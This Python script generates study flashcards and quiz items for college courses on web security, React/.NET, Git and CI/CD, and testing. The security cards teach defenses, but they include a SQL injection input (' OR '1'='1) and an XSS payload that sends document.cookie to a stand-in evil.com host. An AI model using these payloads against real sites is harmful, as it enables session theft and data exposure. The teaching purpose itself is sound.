"""
Generate learning atoms for EASV courses:
- CDS.Security (Authentication, Sessions, Web Security)
- PROGII (React, .NET APIs, Entity Framework)
- SDE2 (Git, CI/CD, Linting)
- SDE2.Testing (Unit Testing, Integration Testing, TestContainers)
"""
import json
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


def generate_security_atoms():
    """Generate CDS.Security learning atoms - CRITICAL for exam."""
    atoms = []

    # ========== AUTHENTICATION ==========
    atoms.append({
        "card_id": "SEC-AUTH-001",
        "front": "What is the difference between authentication and authorization?",
        "back": """AUTHENTICATION: Verifying WHO you are
- "Are you really John?"
- Proves identity (username/password, biometrics, tokens)

AUTHORIZATION: Verifying WHAT you can access
- "Can John access this resource?"
- Determines permissions/roles after authentication

Order: Authentication FIRST, then Authorization""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "authentication",
    })

    atoms.append({
        "card_id": "SEC-AUTH-002",
        "front": "Why should you NEVER store passwords in plain text?",
        "back": """If database is breached:
- Attacker gets ALL passwords instantly
- Users often reuse passwords across sites
- Legal/GDPR violations

CORRECT approach:
1. Hash password with bcrypt/Argon2
2. Use unique salt per password
3. Store only the hash + salt
4. On login: hash input, compare hashes""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "authentication",
    })

    atoms.append({
        "card_id": "SEC-AUTH-MCQ-001",
        "front": "Which password storage approach is secure?",
        "back": json.dumps({
            "options": [
                "Store password encrypted with AES",
                "Store password hashed with bcrypt + unique salt",
                "Store password hashed with MD5",
                "Store password in base64 encoding"
            ],
            "correct": 1,
            "multi_select": False,
            "explanation": "bcrypt with unique salt is secure. MD5 is broken, AES is reversible, base64 is encoding not encryption."
        }),
        "atom_type": "mcq",
        "course": "CDS.Security",
        "topic": "authentication",
    })

    # ========== SESSION MANAGEMENT (Critical - instructor feedback) ==========
    atoms.append({
        "card_id": "SEC-SESSION-001",
        "front": "Why is storing raw user ID in a cookie INSECURE?",
        "back": """VULNERABILITY: Cookie forgery / session hijacking

If cookie contains: userId=abc-123-def

Attacker can:
1. Guess/find another user's GUID
2. Create cookie: userId=other-user-guid
3. Impersonate that user completely

FIX: Use SIGNED cookies or JWT
- Server signs cookie with secret key
- Tampering detected on each request
- ASP.NET: HttpContext.SignInAsync()""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "session",
    })

    atoms.append({
        "card_id": "SEC-SESSION-002",
        "front": "What is the difference between session-based auth and JWT?",
        "back": """SESSION-BASED (Cookie Auth):
- Server stores session data
- Cookie contains session ID only
- Stateful (server must track sessions)
- Easy to invalidate (delete server session)

JWT (Token Auth):
- Token contains all user data (signed)
- Server is stateless
- Self-contained (no server lookup)
- Hard to invalidate before expiry

Choose session for: traditional web apps
Choose JWT for: APIs, microservices, mobile""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "session",
    })

    atoms.append({
        "card_id": "SEC-SESSION-003",
        "front": "In ASP.NET Core, what is the CORRECT way to sign in a user?",
        "back": """WRONG (insecure):
Response.Cookies.Append("userId", user.Id.ToString());

CORRECT (signed cookie):
var claims = new List<Claim> {
    new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
    new Claim(ClaimTypes.Name, user.Username)
};
var identity = new ClaimsIdentity(claims, "Cookies");
var principal = new ClaimsPrincipal(identity);

await HttpContext.SignInAsync(principal);

The framework signs the cookie cryptographically.""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "session",
    })

    atoms.append({
        "card_id": "SEC-SESSION-MCQ-001",
        "front": "Which approach provides secure session management in ASP.NET Core?",
        "back": json.dumps({
            "options": [
                "Response.Cookies.Append(\"userId\", id)",
                "HttpContext.SignInAsync() with ClaimsPrincipal",
                "Storing user ID in localStorage",
                "Passing user ID in query string"
            ],
            "correct": 1,
            "multi_select": False,
            "explanation": "SignInAsync creates cryptographically signed cookies. Raw cookies, localStorage, and query strings are insecure."
        }),
        "atom_type": "mcq",
        "course": "CDS.Security",
        "topic": "session",
    })

    # ========== WEB SECURITY ATTACKS ==========
    atoms.append({
        "card_id": "SEC-ATTACK-001",
        "front": "What is IDOR (Insecure Direct Object Reference)?",
        "back": """IDOR: Accessing resources by manipulating IDs without authorization check.

Example vulnerable endpoint:
GET /api/orders/123  -> Returns order 123

Attack:
User changes 123 to 124 in URL
Gets ANOTHER user's order data!

FIX: Always verify ownership
if (order.UserId != currentUser.Id)
    return Forbid();""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "web_security",
    })

    atoms.append({
        "card_id": "SEC-ATTACK-002",
        "front": "What is SQL Injection and how do you prevent it?",
        "back": """SQL INJECTION: Malicious SQL in user input

Vulnerable code:
$"SELECT * FROM Users WHERE name = '{input}'"

Attack input: ' OR '1'='1
Result: Returns ALL users!

PREVENTION:
1. NEVER concatenate user input into SQL
2. Use parameterized queries:
   cmd.Parameters.AddWithValue("@name", input)
3. Use ORM (Entity Framework)
4. Input validation (but not sufficient alone)""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "web_security",
    })

    atoms.append({
        "card_id": "SEC-ATTACK-003",
        "front": "What is XSS (Cross-Site Scripting)?",
        "back": """XSS: Injecting malicious scripts into web pages

Types:
1. Stored XSS: Script saved in database, served to all users
2. Reflected XSS: Script in URL parameter, executed immediately
3. DOM XSS: Client-side script manipulation

Example attack:
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

PREVENTION:
- Escape/encode output (HTML entities)
- Content Security Policy (CSP)
- HttpOnly cookies (JS can't read)
- Input validation""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "web_security",
    })

    atoms.append({
        "card_id": "SEC-ATTACK-MCQ-001",
        "front": "Which code is vulnerable to SQL injection?",
        "back": json.dumps({
            "options": [
                "ctx.Users.Where(u => u.Name == input)",
                "cmd.Parameters.AddWithValue(\"@n\", input)",
                "$\"SELECT * FROM Users WHERE name = '{input}'\"",
                "await ctx.Users.FindAsync(id)"
            ],
            "correct": 2,
            "multi_select": False,
            "explanation": "String interpolation in SQL is vulnerable. EF queries and parameterized queries are safe."
        }),
        "atom_type": "mcq",
        "course": "CDS.Security",
        "topic": "web_security",
    })

    # ========== DOCKER & DEPLOYMENT ==========
    atoms.append({
        "card_id": "SEC-DOCKER-001",
        "front": "What is the difference between a Docker image and a container?",
        "back": """IMAGE:
- Blueprint/template
- Read-only
- Built from Dockerfile
- Can be shared (Docker Hub)

CONTAINER:
- Running instance of an image
- Has state (can write)
- Isolated process
- Created with 'docker run'

Analogy:
Image = Class definition
Container = Object instance""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "docker",
    })

    atoms.append({
        "card_id": "SEC-DOCKER-002",
        "front": "What is the purpose of a multi-stage Dockerfile?",
        "back": """MULTI-STAGE BUILD:
Reduces final image size by separating build and runtime.

# Stage 1: Build
FROM node:18 AS build
WORKDIR /app
COPY . .
RUN npm ci && npm run build

# Stage 2: Runtime (smaller!)
FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html

Benefits:
- Build tools not in final image
- Smaller attack surface
- Faster deployments""",
        "atom_type": "flashcard",
        "course": "CDS.Security",
        "topic": "docker",
    })

    return atoms


def generate_progii_atoms():
    """Generate Programming II learning atoms."""
    atoms = []

    # ========== REACT ==========
    atoms.append({
        "card_id": "PROG-REACT-001",
        "front": "What is the difference between props and state in React?",
        "back": """PROPS:
- Passed FROM parent TO child
- Read-only (immutable)
- Used for component configuration
- Changes trigger re-render

STATE:
- Managed WITHIN component
- Mutable (via useState setter)
- Used for dynamic data
- Changes trigger re-render

Rule: Props flow DOWN, state is LOCAL""",
        "atom_type": "flashcard",
        "course": "PROGII",
        "topic": "react",
    })

    atoms.append({
        "card_id": "PROG-REACT-002",
        "front": "When does useEffect run?",
        "back": """useEffect(() => { ... }, dependencies)

Dependencies array controls when:

[] (empty): Run ONCE on mount only
[value]: Run on mount AND when 'value' changes
undefined: Run on EVERY render (usually wrong!)

Cleanup function runs:
- Before next effect execution
- On component unmount

useEffect(() => {
  const sub = subscribe();
  return () => sub.unsubscribe(); // cleanup
}, []);""",
        "atom_type": "flashcard",
        "course": "PROGII",
        "topic": "react",
    })

    atoms.append({
        "card_id": "PROG-REACT-003",
        "front": "What is Jotai and why use it over useState?",
        "back": """JOTAI: Global state management library

Problem with useState:
- State is component-local
- Sharing requires "prop drilling"
- Complex for cross-component state

Jotai solution:
// Create atom (global state)
const countAtom = atom(0);

// Use in ANY component
const [count, setCount] = useAtom(countAtom);

Benefits:
- No prop drilling
- Simple API (like useState)
- Automatic re-renders
- Derived atoms for computed state""",
        "atom_type": "flashcard",
        "course": "PROGII",
        "topic": "react",
    })

    # ========== .NET / Entity Framework ==========
    atoms.append({
        "card_id": "PROG-EF-001",
        "front": "What is Entity Framework scaffolding (reverse engineering)?",
        "back": """SCAFFOLDING: Generate C# classes from existing database

Command:
dotnet ef dbcontext scaffold "connection_string" \\
  Npgsql.EntityFrameworkCore.PostgreSQL \\
  --context MyDbContext \\
  --schema myschema

Generates:
1. Entity classes (one per table)
2. DbContext with DbSet<T> properties
3. Relationships (navigation properties)

Use when: Database-first development
Alternative: Code-first with migrations""",
        "atom_type": "flashcard",
        "course": "PROGII",
        "topic": "entity_framework",
    })

    atoms.append({
        "card_id": "PROG-EF-002",
        "front": "What is Dependency Injection and why use it?",
        "back": """DI: Providing dependencies from OUTSIDE rather than creating inside.

WITHOUT DI (tight coupling):
public class OrderService {
    private readonly DbContext _ctx = new DbContext(); // BAD
}

WITH DI (loose coupling):
public class OrderService {
    private readonly DbContext _ctx;
    public OrderService(DbContext ctx) => _ctx = ctx; // GOOD
}

// Register in Program.cs:
builder.Services.AddScoped<OrderService>();

Benefits:
- Testable (inject mock)
- Configurable
- Single Responsibility""",
        "atom_type": "flashcard",
        "course": "PROGII",
        "topic": "dotnet",
    })

    atoms.append({
        "card_id": "PROG-DTO-001",
        "front": "What is a DTO and why use separate DTOs for requests/responses?",
        "back": """DTO = Data Transfer Object

Purpose: Shape data for specific use cases

Entity (database model):
- All columns including sensitive ones
- Navigation properties
- Internal IDs

CreateDto (request):
- Only fields user should provide
- Validation attributes
- No ID (server generates)

ResponseDto:
- Only fields client needs
- No sensitive data
- Computed/formatted fields

Prevents: Over-posting, data leakage, circular refs""",
        "atom_type": "flashcard",
        "course": "PROGII",
        "topic": "dotnet",
    })

    atoms.append({
        "card_id": "PROG-VALID-001",
        "front": "How do you add server-side validation in ASP.NET Core?",
        "back": """Use Data Annotations on DTOs:

public class CreatePetDto
{
    [Required]
    [MinLength(3)]
    public string Name { get; set; }

    [Range(0, 15)]
    public int Age { get; set; }

    [EmailAddress]
    public string OwnerEmail { get; set; }
}

In controller:
[HttpPost]
public IActionResult Create(CreatePetDto dto)
{
    if (!ModelState.IsValid)
        return BadRequest(ModelState);
    // ...
}

Automatic validation with [ApiController] attribute.""",
        "atom_type": "flashcard",
        "course": "PROGII",
        "topic": "dotnet",
    })

    return atoms


def generate_sde2_atoms():
    """Generate Systems Development II atoms."""
    atoms = []

    # ========== GIT ==========
    atoms.append({
        "card_id": "SDE-GIT-001",
        "front": "What is a Git Pull Request (PR)?",
        "back": """PULL REQUEST: Request to merge one branch into another

Workflow:
1. Create feature branch
2. Make commits
3. Push to remote
4. Open PR (GitHub/GitLab)
5. Code review by team
6. Merge after approval

Benefits:
- Code review before merge
- Discussion on changes
- CI/CD can run tests
- History of decisions""",
        "atom_type": "flashcard",
        "course": "SDE2",
        "topic": "git",
    })

    atoms.append({
        "card_id": "SDE-GIT-002",
        "front": "What is GitHub Flow?",
        "back": """GITHUB FLOW: Simple branching strategy

Rules:
1. main branch is ALWAYS deployable
2. Create branch FROM main for features
3. Commit to feature branch
4. Open PR when ready
5. After review + tests pass → merge
6. Deploy immediately after merge

vs Git Flow:
- Simpler (no develop, release branches)
- Continuous deployment friendly
- Best for web apps with frequent releases""",
        "atom_type": "flashcard",
        "course": "SDE2",
        "topic": "git",
    })

    # ========== CI/CD ==========
    atoms.append({
        "card_id": "SDE-CICD-001",
        "front": "What is the difference between CI and CD?",
        "back": """CI (Continuous Integration):
- Merge code frequently (daily+)
- Automated build on each push
- Automated tests run
- Fast feedback on breakage

CD (Continuous Delivery):
- Code always in deployable state
- Automated deployment to staging
- Manual approval for production

CD (Continuous Deployment):
- Every passing build auto-deploys
- No manual approval
- Requires excellent test coverage""",
        "atom_type": "flashcard",
        "course": "SDE2",
        "topic": "cicd",
    })

    atoms.append({
        "card_id": "SDE-CICD-002",
        "front": "What is a GitHub Actions workflow?",
        "back": """WORKFLOW: Automated process defined in YAML

Location: .github/workflows/ci.yml

name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - run: npm ci
      - run: npm test

Key concepts:
- Triggers (on): push, PR, schedule
- Jobs: run in parallel by default
- Steps: sequential within a job
- Actions: reusable steps""",
        "atom_type": "flashcard",
        "course": "SDE2",
        "topic": "cicd",
    })

    # ========== GIT HOOKS ==========
    atoms.append({
        "card_id": "SDE-HOOKS-001",
        "front": "What are Git hooks and what is Husky?",
        "back": """GIT HOOKS: Scripts that run on Git events

Common hooks:
- pre-commit: Before commit is created
- commit-msg: Validate commit message
- pre-push: Before push to remote

HUSKY: Tool to manage Git hooks easily

Setup:
npx husky init
echo "npm test" > .husky/pre-commit

Use with lint-staged:
- Only lint/format STAGED files
- Faster than checking everything""",
        "atom_type": "flashcard",
        "course": "SDE2",
        "topic": "git_hooks",
    })

    return atoms


def generate_testing_atoms():
    """Generate SDE2.Testing atoms."""
    atoms = []

    atoms.append({
        "card_id": "TEST-UNIT-001",
        "front": "What is the 3A pattern in unit testing?",
        "back": """3A PATTERN: Arrange, Act, Assert

[Fact]
public void CreatePet_ValidInput_ReturnsPet()
{
    // ARRANGE - Set up test data
    var dto = new CreatePetDto { Name = "Rex", Age = 3 };
    var service = new PetService(mockDb);

    // ACT - Execute the method
    var result = service.Create(dto);

    // ASSERT - Verify outcome
    Assert.Equal("Rex", result.Name);
    Assert.NotNull(result.Id);
}

Keep each section focused and minimal.""",
        "atom_type": "flashcard",
        "course": "SDE2.Testing",
        "topic": "unit_testing",
    })

    atoms.append({
        "card_id": "TEST-CONTAINER-001",
        "front": "What is TestContainers and why use it?",
        "back": """TESTCONTAINERS: Spin up real Docker containers for tests

Problem: Testing with real database
- SQLite differs from Postgres
- In-memory mocks miss edge cases
- Shared test DB causes flaky tests

Solution:
var container = new PostgreSqlBuilder().Build();
await container.StartAsync();
var connectionString = container.GetConnectionString();

Benefits:
- Real database behavior
- Isolated per test
- Same as production
- Auto-cleanup after tests""",
        "atom_type": "flashcard",
        "course": "SDE2.Testing",
        "topic": "integration_testing",
    })

    atoms.append({
        "card_id": "TEST-DI-001",
        "front": "How do you use Dependency Injection in xUnit tests?",
        "back": """Use Xunit.DependencyInjection package:

// Startup.cs in test project
public class Startup
{
    public void ConfigureServices(IServiceCollection services)
    {
        Program.ConfigureServices(services); // Reuse app config

        // Replace DbContext with test container
        services.RemoveAll(typeof(MyDbContext));
        services.AddScoped<MyDbContext>(provider => {
            var container = new PostgreSqlBuilder().Build();
            container.StartAsync().Wait();
            // ... setup context
        });
    }
}

// Test class receives dependencies via constructor
public class PetTests(PetService service)
{
    [Fact]
    public void Test() => Assert.NotNull(service);
}""",
        "atom_type": "flashcard",
        "course": "SDE2.Testing",
        "topic": "integration_testing",
    })

    return atoms


def generate_all():
    """Generate all EASV course atoms."""
    all_atoms = []
    all_atoms.extend(generate_security_atoms())
    all_atoms.extend(generate_progii_atoms())
    all_atoms.extend(generate_sde2_atoms())
    all_atoms.extend(generate_testing_atoms())

    output_file = OUTPUT_DIR / "easv_course_atoms.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(all_atoms, f, indent=2, ensure_ascii=False)

    # Count by course
    by_course = {}
    for atom in all_atoms:
        course = atom.get("course", "Unknown")
        by_course[course] = by_course.get(course, 0) + 1

    print(f"Generated {len(all_atoms)} EASV course atoms:")
    for course, count in sorted(by_course.items()):
        print(f"  - {course}: {count}")
    print(f"Saved to: {output_file}")

    return all_atoms


if __name__ == "__main__":
    generate_all()
